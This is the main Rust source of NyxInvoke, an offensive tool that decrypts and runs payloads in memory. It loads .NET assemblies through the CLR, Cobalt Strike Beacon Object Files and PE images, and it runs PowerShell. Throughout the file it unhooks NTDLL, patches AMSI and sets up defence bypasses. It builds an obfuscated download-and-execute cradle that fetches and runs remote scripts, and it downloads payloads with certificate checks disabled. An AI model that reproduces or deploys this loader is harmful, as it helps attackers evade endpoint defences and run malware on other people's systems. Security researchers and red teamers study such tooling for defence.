#![allow(non_snake_case, non_camel_case_types,dead_code)]


// Standard library imports
use std::fs::File;
use std::io::Read;
use std::path::Path;
// External crate imports
use clap::{Parser, Subcommand};
use crypto::{
    aes, blockmodes, buffer,
    buffer::{BufferResult, ReadBuffer, WriteBuffer},
    symmetriccipher,
};
use reqwest::blocking::{Client};
use base64::{Engine as _, engine::general_purpose};

// Project-specific imports
use crate::runpe::PE;
use crate::unhook::{initialize_nt_functions, clear_ntdll};
use crate::patch::{setup_bypass, patch_amsi};

// CLR-related imports
use clroxide::{
    clr::Clr,
    primitives::{_Assembly, wrap_method_arguments, wrap_string_in_variant},
};

// Coffee loader import
use coffee_ldr::loader::Coffee;

// WinAPI imports
use winapi::{
    ctypes::c_void,
    um::{
        fileapi::{FlushFileBuffers, WriteFile},
        handleapi::INVALID_HANDLE_VALUE,
        processenv::GetStdHandle,
        winbase::{STD_ERROR_HANDLE, STD_OUTPUT_HANDLE},
        wincon::{ATTACH_PARENT_PROCESS, AttachConsole},
    },
};


fn aes_decrypt(encrypted_data: &[u8],key: &[u8],iv: &[u8]) -> Result<Vec<u8>, symmetriccipher::SymmetricCipherError> {
    let mut decryptor =
        aes::cbc_decryptor(aes::KeySize::KeySize256, key, iv, blockmodes::PkcsPadding);

    let mut final_result = Vec::<u8>::new();
    let mut read_buffer = buffer::RefReadBuffer::new(encrypted_data);
    let mut buffer = [0; 4096];
    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);

    loop {
        let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
        final_result.extend(
            write_buffer
                .take_read_buffer()
                .take_remaining()
                .iter()
                .map(|&i| i),
        );
        match result {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => {}
        }
    }

    Ok(final_result)

}


unsafe fn runspace_execute(command: &str, is_remote: bool) -> Result<String, String> {
    // Initialize the CLR
    let mut clr = Clr::context_only(None).map_err(|e| e.to_string())?;
    let context = clr.get_context().map_err(|e| e.to_string())?;
    let app_domain = context.app_domain;
    let mscorlib = (*app_domain).load_library("mscorlib").map_err(|e| e.to_string())?;

    // Load the 'System.Management.Automation' assembly
    let assembly_type = (*mscorlib).get_type("System.Reflection.Assembly").map_err(|e| e.to_string())?;
    let assembly_load_with_partial_name_fn = (*assembly_type).get_method_with_signature(
        "System.Reflection.Assembly LoadWithPartialName(System.String)",
    ).map_err(|e| e.to_string())?;
    let automation_variant = (*assembly_load_with_partial_name_fn).invoke(
        wrap_method_arguments(vec![wrap_string_in_variant("System.Management.Automation")]).map_err(|e| e.to_string())?,
        None,
    ).map_err(|e| e.to_string())?;
    let automation = automation_variant.Anonymous.Anonymous.Anonymous.byref as *mut _ as *mut _Assembly;

    // Get types
    let runspace_factory_type = (*automation).get_type("System.Management.Automation.Runspaces.RunspaceFactory").map_err(|e| e.to_string())?;
    let runspace_type = (*automation).get_type("System.Management.Automation.Runspaces.Runspace").map_err(|e| e.to_string())?;
    let runspace_pipeline_type = (*automation).get_type("System.Management.Automation.Runspaces.Pipeline").map_err(|e| e.to_string())?;
    let runspace_pipeline_commands_type = (*automation).get_type("System.Management.Automation.Runspaces.CommandCollection").map_err(|e| e.to_string())?;
    let runspace_pipeline_reader_type = (*automation).get_type(
        "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject]"
    ).map_err(|e| e.to_string())?;
    let psobject_type = (*automation).get_type("System.Management.Automation.PSObject").map_err(|e| e.to_string())?;

    // Get functions
    let runspace_create_fn = (*runspace_factory_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.Runspace CreateRunspace()",
    ).map_err(|e| e.to_string())?;
    let runspace_open_fn = (*runspace_type).get_method("Open").map_err(|e| e.to_string())?;
    let runspace_dispose_fn = (*runspace_type).get_method("Dispose")?;

    let pipeline_create_fn = (*runspace_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.Pipeline CreatePipeline()",
    ).map_err(|e| e.to_string())?;
    let commands_addscript_fn = (*runspace_pipeline_commands_type)
        .get_method_with_signature("Void AddScript(System.String)").map_err(|e| e.to_string())?;
    let pipeline_invoke_async_fn = (*runspace_pipeline_type).get_method_with_signature("Void InvokeAsync()").map_err(|e| e.to_string())?;
    let pipeline_getoutput_fn = (*runspace_pipeline_type).get_method_with_signature(
        "System.Management.Automation.Runspaces.PipelineReader`1[System.Management.Automation.PSObject] get_Output()"
    ).map_err(|e| e.to_string())?;
    let pipeline_reader_read_fn = (*runspace_pipeline_reader_type)
        .get_method_with_signature("System.Management.Automation.PSObject Read()").map_err(|e| e.to_string())?;
    let psobject_tostring_fn = (*psobject_type).get_method_with_signature("System.String ToString()").map_err(|e| e.to_string())?;

    // Create and open the runspace
    let runspace = (*runspace_create_fn).invoke_without_args(None).map_err(|e| e.to_string())?;
    (*runspace_open_fn).invoke_without_args(Some(runspace.clone())).map_err(|e| e.to_string())?;

    // Create the pipeline and add the command
    let pipeline = (*pipeline_create_fn).invoke_without_args(Some(runspace.clone())).map_err(|e| e.to_string())?;
    let pipeline_commands_property = (*runspace_pipeline_type).get_property("Commands").map_err(|e| e.to_string())?;
    let commands_collection = (*pipeline_commands_property).get_value(Some(pipeline.clone())).map_err(|e| e.to_string())?;

    let script_command = if is_remote {
        format!("(new-object net.webclient).downloadstring('{}') |  & ( $env:DriverData[4]+$env:SESSIONNAME[6]+$env:PATHEXT[7]) | Out-String", command)
    } else {
        format!("{} | Out-String", command)
    };

    (*commands_addscript_fn).invoke(
        wrap_method_arguments(vec![wrap_string_in_variant(
            script_command.as_str(),
        )]).map_err(|e| e.to_string())?,
        Some(commands_collection),
    ).map_err(|e| e.to_string())?;

    // Execute the pipeline and read the output
    (*pipeline_invoke_async_fn).invoke_without_args(Some(pipeline.clone())).map_err(|e| e.to_string())?;
    let reader = (*pipeline_getoutput_fn).invoke_without_args(Some(pipeline.clone())).map_err(|e| e.to_string())?;
    let reader_read = (*pipeline_reader_read_fn).invoke_without_args(Some(reader.clone())).map_err(|e| e.to_string())?;
    let reader_read_tostring = (*psobject_tostring_fn).invoke_without_args(Some(reader_read.clone())).map_err(|e| e.to_string())?;
    // Clean up the runspace
    (*runspace_dispose_fn).invoke_without_args(Some(runspace.clone()))?;
    Ok(reader_read_tostring.Anonymous.Anonymous.Anonymous.bstrVal.to_string())

}


fn read_file(filename: &str) -> Result<Vec<u8>, String> {
    // Check if the file exists
    if !Path::new(filename).exists() {
        return Err(format!("File '{}' does not exist", filename));
    }

    let mut file = File::open(filename)
        .map_err(|e| format!("Failed to open file '{}': {}", filename, e))?;
    
    let mut contents = Vec::new();
    file.read_to_end(&mut contents)
        .map_err(|e| format!("Failed to read file '{}': {}", filename, e))?;
    
    Ok(contents)
}

fn fetch_file_from_url(url: &str) -> Result<Vec<u8>, String> {
    // Build a custom client that disables SSL certificate validation
    let client = Client::builder()
        .danger_accept_invalid_certs(true) // Allow self-signed or invalid certificates
        .build()
        .map_err(|e| format!("Failed to build the HTTP client: {}", e))?;

    // Make the request using the custom client
    let response = client
        .get(url)
        .send()
        .map_err(|e| format!("Failed to fetch the URL {}: {}", url, e))?;

    if !response.status().is_success() {
        return Err(format!(
            "Non-success response from {}: {}",
            url,
            response.status()
        ));
    }

    let bytes = response
        .bytes()
        .map_err(|e| format!("Failed to read response from {}: {}", url, e))?;
    Ok(bytes.to_vec())

}


fn fetch_or_read_file(path: &str) -> Result<Vec<u8>, String> {
    if path.starts_with("http://") || path.starts_with("https://") {
        fetch_file_from_url(path)
    } else {
        read_file(path)
    }
}

fn parse_bof_arguments(args: &[String]) -> Result<Vec<u8>, String> {
    let mut parsed_args = Vec::new();
    for arg in args {
        let parts: Vec<&str> = arg.splitn(2, '=').collect();
        if parts.len() != 2 {
            return Err(format!("Invalid argument format: {}. Use <type>=<value>", arg));
        }
        let (arg_type, value) = (parts[0], parts[1]);
        match arg_type {
            "str" => {
                let bytes = value.as_bytes();
                parsed_args.extend_from_slice(&(bytes.len() as u32).to_le_bytes());
                parsed_args.extend_from_slice(bytes);
                parsed_args.push(0); // null terminator
            },
            "wstr" => {
                let wide_bytes: Vec<u16> = value.encode_utf16().collect();
                parsed_args.extend_from_slice(&((wide_bytes.len() + 1) as u32).to_le_bytes());
                for wide_char in wide_bytes {
                    parsed_args.extend_from_slice(&wide_char.to_le_bytes());
                }
                parsed_args.extend_from_slice(&[0, 0]); // null terminator for wide string
            },
            "int" => {
                let int_value = value.parse::<i32>()
                    .map_err(|e| format!("Failed to parse int: {}", e))?;
                parsed_args.extend_from_slice(&int_value.to_le_bytes());
            },
            "short" => {
                let short_value = value.parse::<i16>()
                    .map_err(|e| format!("Failed to parse short: {}", e))?;
                parsed_args.extend_from_slice(&short_value.to_le_bytes());
            },
            "bin" => {
                let decoded = general_purpose::STANDARD.decode(value)
                    .map_err(|e| format!("Failed to decode base64: {}", e))?;
                parsed_args.extend_from_slice(&(decoded.len() as u32).to_le_bytes());
                parsed_args.extend_from_slice(&decoded);
            },
            _ => return Err(format!("Unsupported argument type: {}", arg_type)),
        }
    }
    Ok(parsed_args)

}


#[cfg(feature = "compiled_clr")]
#[link_section = ".rdata"]
pub fn compiled_clr() -> (&'static [u8], [u8; 32], [u8; 16]) {
    (
        &*include_bytes!("../Resources/clr_data.enc"),
        *include_bytes!("../Resources/clr_aes.key"),
        *include_bytes!("../Resources/clr_aes.iv"),
    )
}



#[cfg(feature = "compiled_bof")]
#[link_section = ".rdata"]
pub fn compiled_bof() -> (&'static [u8], [u8; 32], [u8; 16]) {
    (
        &*include_bytes!("../Resources/bof_data.enc"),
        *include_bytes!("../Resources/bof_aes.key"),
        *include_bytes!("../Resources/bof_aes.iv"),
    )
}

// Optionally, provide a stub when the feature is not enabled
#[cfg(not(feature = "compiled_bof"))]
pub fn compiled_bof() -> Option<&'static [u8]> {
    None
}

// Add this to your feature declarations
#[cfg(feature = "compiled_pe")]
#[link_section = ".rdata"]
pub fn compiled_pe() -> (&'static [u8], [u8; 32], [u8; 16]) {
    (
        &*include_bytes!("../Resources/pe_data.enc"),
        *include_bytes!("../Resources/pe_aes.key"),
        *include_bytes!("../Resources/pe_aes.iv"),
    )
}

// Optionally, provide a stub when the feature is not enabled
#[cfg(not(feature = "compiled_pe"))]
pub fn compiled_pe() -> Option<(&'static [u8], [u8; 32], [u8; 16])> {
    None
}


#[derive(Parser)]
#[command(
    name = "NyxInvoke",
    version = "0.3.0",
    author = "BlackSnufkin"
)]
pub struct Cli {
    #[command(subcommand)]
    pub mode: Mode,
}

#[derive(Subcommand)]
pub enum Mode {
    /// Execute Common Language Runtime (CLR) assemblies
    #[command(
        long_about = "Execute .NET assemblies using the Common Language Runtime (CLR).",
        after_help = "Example: NyxInvoke.exe clr --assembly payload.enc --key key.bin --iv iv.bin --args \"arg1 arg2\""
    )]
    Clr {
        /// Arguments to pass to the assembly
        #[arg(long, value_name = "ARGS", num_args = 1.., value_delimiter = ' ', short = 'a', allow_hyphen_values = true)]
        args: Vec<String>,

        /// Base URL or path for resources
        #[arg(long, value_name = "URL_OR_PATH", short = 'b')]
        base: Option<String>,

        /// Path to the encryption key file
        #[arg(long, value_name = "KEY_FILE", short = 'k')]
        key: Option<String>,

        /// Path to the initialization vector (IV) file
        #[arg(long, value_name = "IV_FILE", short = 'i')]
        iv: Option<String>,

        /// Path or URL to the encrypted assembly file to execute
        #[arg(long, value_name = "ASSEMBLY_FILE", short = 'f')]
        assembly: Option<String>,
        
        /// Whether the assembly is unencrypted (default is encrypted)
        #[arg(long, short = 'u')]
        unencrypted: bool,
    },

    /// Execute Beacon Object Files (BOF)
    #[command(
        long_about = "Execute Beacon Object Files (BOF) for Cobalt Strike.",
        after_help = "Example: NyxInvoke.exe bof --bof payload.enc --key key.bin --iv iv.bin --args \"arg1 arg2\""
    )]
    Bof {
        /// Arguments to pass to the BOF
        #[arg(long, value_name = "ARGS", num_args = 1.., value_delimiter = ' ', short = 'a', allow_hyphen_values = true)]
        args: Option<Vec<String>>,

        /// Base URL or path for resources
        #[arg(long, value_name = "URL_OR_PATH", short = 'b')]
        base: Option<String>,

        /// Path to the encryption key file
        #[arg(long, value_name = "KEY_FILE", short = 'k')]
        key: Option<String>,

        /// Path to the initialization vector (IV) file
        #[arg(long, value_name = "IV_FILE", short = 'i')]
        iv: Option<String>,

        /// Path or URL to the encrypted BOF file to execute
        #[arg(long, value_name = "BOF_FILE", short = 'f')]
        bof: Option<String>,
        
        /// Whether the BOF is unencrypted (default is encrypted)
        #[arg(long, short = 'u')]
        unencrypted: bool,
    },

    /// Execute Portable Executable (PE) files
    #[command(
        long_about = "Execute Portable Executable (PE) files locally.",
        after_help = "Example: NyxInvoke.exe pe --pe payload.enc --key key.bin --iv iv.bin --args \"arg1 arg2\""
    )]
    Pe {
        /// Arguments to pass to the PE
        #[arg(long, value_name = "ARGS", num_args = 1.., value_delimiter = ' ', short = 'a', allow_hyphen_values = true)]
        args: Option<Vec<String>>,

        /// Base URL or path for resources
        #[arg(long, value_name = "URL_OR_PATH", short = 'b')]
        base: Option<String>,

        /// Path to the encryption key file
        #[arg(long, value_name = "KEY_FILE", short = 'k')]
        key: Option<String>,

        /// Path to the initialization vector (IV) file
        #[arg(long, value_name = "IV_FILE", short = 'i')]
        iv: Option<String>,

        /// Path or URL to the encrypted PE file to execute
        #[arg(long, value_name = "PE_FILE", short = 'f')]
        pe: Option<String>,

        /// Whether the PE is unencrypted (default is encrypted)
        #[arg(long, short = 'u')]
        unencrypted: bool,
    },

    /// Execute PowerShell commands or scripts
    #[command(
        long_about = "Execute PowerShell commands or scripts.",
        after_help = "Examples:\nNyxInvoke.exe ps --command \"Get-Process\"\nNyxInvoke.exe ps --script script.ps1"
    )]
    Ps {
        /// PowerShell command to execute
        #[arg(long, value_name = "PS_COMMAND", short = 'c')]
        command: Option<String>,

        /// Path or URL to the PowerShell script to execute
        #[arg(long, value_name = "PS_SCRIPT", short = 's')]
        script: Option<String>,
    },

}


pub fn execute_clr_mode(args: Vec<String>, base: Option<String>, key: Option<String>, iv: Option<String>, assembly: Option<String>, unencrypted: bool) -> Result<(), String> {
    let (data, key_bytes, iv_bytes) = if let Some(assembly_path) = assembly {
        let assembly_full_path = if let Some(ref base_path) = base {
            format!("{}/{}", base_path, assembly_path)
        } else {
            assembly_path
        };
        
        let data = fetch_or_read_file(&assembly_full_path)?;
        
        if !unencrypted {
            if let (Some(key_path), Some(iv_path)) = (key, iv) {
                let (key_full_path, iv_full_path) = if let Some(base_path) = &base {
                    (
                        format!("{}/{}", base_path, key_path),
                        format!("{}/{}", base_path, iv_path),
                    )
                } else {
                    (key_path, iv_path)
                };
                
                let key_bytes = fetch_or_read_file(&key_full_path)?;
                let iv_bytes = fetch_or_read_file(&iv_full_path)?;
                (data, Some(key_bytes), Some(iv_bytes))
            } else {
                return Err("Key and IV are required for encrypted data".to_string());
            }
        } else {
            (data, None, None)
        }
    } else {
        // Use compiled data
        #[cfg(feature = "compiled_clr")]
        {
            let (data_ref, key_ref, iv_ref) = compiled_clr();
            (data_ref.to_vec(), Some(key_ref.to_vec()), Some(iv_ref.to_vec()))
        }
        #[cfg(not(feature = "compiled_clr"))]
        {
            return Err("Compiled data is not included in this build. Enable the 'compiled_clr' feature to include it.".to_string());
        }
    };

    setup_bypass()?;
    
    let clr_data = if !unencrypted {
        let key_bytes = key_bytes.ok_or("Key is required for decryption")?;
        let iv_bytes = iv_bytes.ok_or("IV is required for decryption")?;
        aes_decrypt(&data, &key_bytes, &iv_bytes)
            .map_err(|e| format!("[!] Decryption failed: {:?}", e))?
    } else {
        data
    };

    if !unencrypted {
        println!("[+] Decryption successful!");
    }

    let mut clr = Clr::new(clr_data, args)
        .map_err(|e| format!("Clr initialization failed: {:?}", e))?;
    let results = clr
        .run()
        .map_err(|e| format!("Clr run failed: {:?}", e))?;
    println!("[+] Results:\n\n{}", results);
    
    Ok(())
}

pub fn execute_bof_mode(args: Option<Vec<String>>, base: Option<String>, key: Option<String>, iv: Option<String>, bof: Option<String>, unencrypted: bool) -> Result<(), String> {
    // Determine data, key_bytes, iv_bytes
    let (data, key_bytes, iv_bytes) = if let Some(bof_path) = bof {
        let bof_full_path = if let Some(ref base_path) = base {
            format!("{}/{}", base_path, bof_path)
        } else {
            bof_path
        };

        let data = fetch_or_read_file(&bof_full_path)?;

        if !unencrypted {
            if let (Some(key_path), Some(iv_path)) = (key, iv) {
                let (key_full_path, iv_full_path) = if let Some(base_path) = &base {
                    (
                        format!("{}/{}", base_path, key_path),
                        format!("{}/{}", base_path, iv_path),
                    )
                } else {
                    (key_path, iv_path)
                };

                let key_bytes = fetch_or_read_file(&key_full_path)?;
                let iv_bytes = fetch_or_read_file(&iv_full_path)?;
                (data, Some(key_bytes), Some(iv_bytes))
            } else {
                return Err("Key and IV are required for encrypted data".to_string());
            }
        } else {
            (data, None, None)
        }
    } else {
        // Use compiled BOF data
        #[cfg(feature = "compiled_bof")]
        {
            let (data_ref, key_ref, iv_ref) = compiled_bof();
            (data_ref.to_vec(), Some(key_ref.to_vec()), Some(iv_ref.to_vec()))
        }
        #[cfg(not(feature = "compiled_bof"))]
        {
            return Err("Compiled BOF data is not included in this build. Enable the 'compiled_bof' feature to include it.".to_string());
        }
    };

    // Initialize NT functions
    initialize_nt_functions();

    // Perform unhooking
    if !clear_ntdll() {
        return Err("Failed to clear NTDLL hooks".to_string());
    }

    setup_bypass()?;
    println!("[+] Bypass setup complete");

    // Decrypt the BOF data if encrypted
    let bof_data = if !unencrypted {
        let key_bytes = key_bytes.ok_or("Key is required for decryption")?;
        let iv_bytes = iv_bytes.ok_or("IV is required for decryption")?;
        aes_decrypt(&data, &key_bytes, &iv_bytes)
            .map_err(|e| format!("[!] Decryption failed: {:?}", e))?
    } else {
        data
    };

    if !unencrypted {
        println!("[+] Decryption successful!");
    }

    // Parse and prepare arguments
    let parsed_args = match args {
        Some(arg_vec) => parse_bof_arguments(&arg_vec)?,
        None => vec![],
    };

    // Load and execute the BOF using coffee-ldr
    let coffee = Coffee::new(&bof_data)
        .map_err(|e| format!("[!] Failed to load BOF: {:?}", e))?;
    println!("[+] Loaded BOF successfully");

    let output = coffee.execute(
        Some(parsed_args.as_ptr()),
        Some(parsed_args.len()),
        None
    ).map_err(|e| format!("[!] BOF execution failed: {}", e))?;

    println!("\n{}", output);

    Ok(())
}


pub fn execute_pe_mode(args: Option<Vec<String>>, base: Option<String>, key: Option<String>, iv: Option<String>, pe: Option<String>, unencrypted: bool) -> Result<(), String> {
    let (data, key_bytes, iv_bytes) = if let Some(pe_path) = pe {
        let pe_full_path = if let Some(ref base_path) = base {
            format!("{}/{}", base_path, pe_path)
        } else {
            pe_path
        };

        let data = fetch_or_read_file(&pe_full_path)?;

        if !unencrypted {
            if let (Some(key_path), Some(iv_path)) = (key, iv) {
                let (key_full_path, iv_full_path) = if let Some(base_path) = &base {
                    (
                        format!("{}/{}", base_path, key_path),
                        format!("{}/{}", base_path, iv_path),
                    )
                } else {
                    (key_path, iv_path)
                };

                let key_bytes = fetch_or_read_file(&key_full_path)?;
                let iv_bytes = fetch_or_read_file(&iv_full_path)?;
                (data, Some(key_bytes), Some(iv_bytes))
            } else {
                return Err("Key and IV are required for encrypted data".to_string());
            }
        } else {
            (data, None, None)
        }
    } else {
        // Use compiled PE data
        #[cfg(feature = "compiled_pe")]
        {
            let (data_ref, key_ref, iv_ref) = compiled_pe();
            (data_ref.to_vec(), Some(key_ref.to_vec()), Some(iv_ref.to_vec()))
        }
        #[cfg(not(feature = "compiled_pe"))]
        {
            return Err("Compiled data is not included in this build. Enable the 'compiled_pe' feature to include it.".to_string());
        }
    };

    // Initialize NT functions
    initialize_nt_functions();

    // Perform unhooking
    if !clear_ntdll() {
        return Err("Failed to clear NTDLL hooks".to_string());
    }
    

    setup_bypass()?;

    let pe_data = if !unencrypted {
        let key_bytes = key_bytes.ok_or("Key is required for decryption")?;
        let iv_bytes = iv_bytes.ok_or("IV is required for decryption")?;
        aes_decrypt(&data, &key_bytes, &iv_bytes)
            .map_err(|e| format!("[!] Decryption failed: {:?}", e))?
    } else {
        data
    };

    if !unencrypted {
        println!("[+] Decryption successful!");
    }

    // Proceed with PE execution
    let mut pe = PE::new(pe_data).ok_or("[!] Invalid PE file")?;
    let param = args.map(|arg_vec| arg_vec.join(" ")).unwrap_or_default();
    pe.local_pe_exec(param)?;

    Ok(())
}


pub fn execute_ps_mode(command: Option<String>, script: Option<String>) -> Result<(), String> {
    setup_bypass()?;
    
    if let Some(cmd) = command {
        // Execute the PowerShell command
        let _ = patch_amsi();
        let result = unsafe { runspace_execute(&cmd, false) };
        match result {
            Ok(output) => println!("[+] Output:\n{}", output),
            Err(err) => return Err(format!("[!] Error: {}", err)),
        }
    } else if let Some(script_path) = script {
        let _ = patch_amsi();
        let is_remote = script_path.starts_with("http://") || script_path.starts_with("https://");

        if !is_remote && !Path::new(&script_path).exists() {
            return Err(format!("Script file '{}' does not exist", script_path));
        }

        // Pass the script path and is_remote flag to runspace_execute
        let result = unsafe { runspace_execute(&script_path, is_remote) };
        match result {
            Ok(output) => println!("[+] Output:\n{}", output),
            Err(err) => return Err(format!("[!] Error: {}", err)),
        }
    } else {
        return Err("Either --command or --script must be provided.".to_string());
    }
    
    Ok(())
}



#[cfg(feature = "dll")]
pub mod dll_specific {
    use super::*;
    use std::sync::Once;

    static INIT: Once = Once::new();
    static mut STDOUT_HANDLE: *mut c_void = INVALID_HANDLE_VALUE as *mut c_void;
    static mut STDERR_HANDLE: *mut c_void = INVALID_HANDLE_VALUE as *mut c_void;

    pub fn write_to_console(handle: *mut c_void, message: &str) {
        unsafe {
            if handle != INVALID_HANDLE_VALUE as *mut c_void {
                let mut written: u32 = 0;
                WriteFile(
                    handle,
                    message.as_ptr() as *const c_void,
                    message.len() as u32,
                    &mut written,
                    std::ptr::null_mut(),
                );
                FlushFileBuffers(handle);
            }
        }
    }

    pub fn init_console() {
        INIT.call_once(|| {
            unsafe {
                if AttachConsole(ATTACH_PARENT_PROCESS) != 0 {
                    STDOUT_HANDLE = GetStdHandle(STD_OUTPUT_HANDLE);
                    STDERR_HANDLE = GetStdHandle(STD_ERROR_HANDLE);
                }
            }
        });
    }

    pub fn get_stdout_handle() -> *mut c_void {
        unsafe { STDOUT_HANDLE }
    }

    pub fn get_stderr_handle() -> *mut c_void {
        unsafe { STDERR_HANDLE }
    }
}
